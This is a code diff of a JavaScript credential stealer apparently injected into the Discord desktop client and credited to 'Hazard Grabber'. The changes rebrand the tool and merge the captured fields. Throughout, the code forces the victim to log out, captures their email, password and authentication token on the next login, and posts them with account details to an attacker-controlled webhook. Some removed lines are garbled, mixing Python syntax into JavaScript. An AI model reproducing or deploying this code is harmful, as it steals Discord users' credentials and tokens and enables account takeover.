@@ -5,10 +5,10 @@ const querystring = require('querystring');
 var webhook = "%WEBHOOK_LINK%";
 
 function FirstTime() {
-    if (!fs.existsSync(path.join(__dirname, "stenko"))) {
+    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
         return !0
     }
-    fs.rmdirSync(path.join(__dirname, "stenko"));
+    fs.rmdirSync(path.join(__dirname, "Hazard"));
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     return !1
@@ -128,7 +128,7 @@ function SendToWebhook(what) {
      badges += "Discord Developer,";
   }
   if (badges == "" ){
-      badges = "no badges"
+      badges = "None"
   }
   return badges;
   
@@ -144,7 +144,7 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "stenko premium version",
+            username: "stenko",
             content: "",
             avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
             embeds: [
@@ -152,25 +152,10 @@ function Login(email, password, token) {
                     "color": 3092790,
                     "fields": [
                         {
-                            "name": " email",
-                            "value": ` - `${email}``,
+                            "name": " account",
+                            "value": `email - ${email} & password - ${password}`,
                             "inline": true
                         },
-			{
-			    "name": "᲼᲼",
-			    "value": f"᲼᲼",
-			    "inline": False
-			},
-                        {
-                            "name": " password",
-                            "value": ` - `${password}``,
-                            "inline": true
-                        },
-			{
-			    "name": "᲼᲼",
-			    "value": f"᲼᲼",
-			    "inline": False
-			},
                         {
                             "name": " token",
                             "value": ` - \`${token}\``,
@@ -178,13 +163,11 @@ function Login(email, password, token) {
                         }
                     ],
                     "author": {
-                        "name": `stenko`,
-                    },
-		    "thumbnail": {
-                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": ""
                     }
                 }
             ]
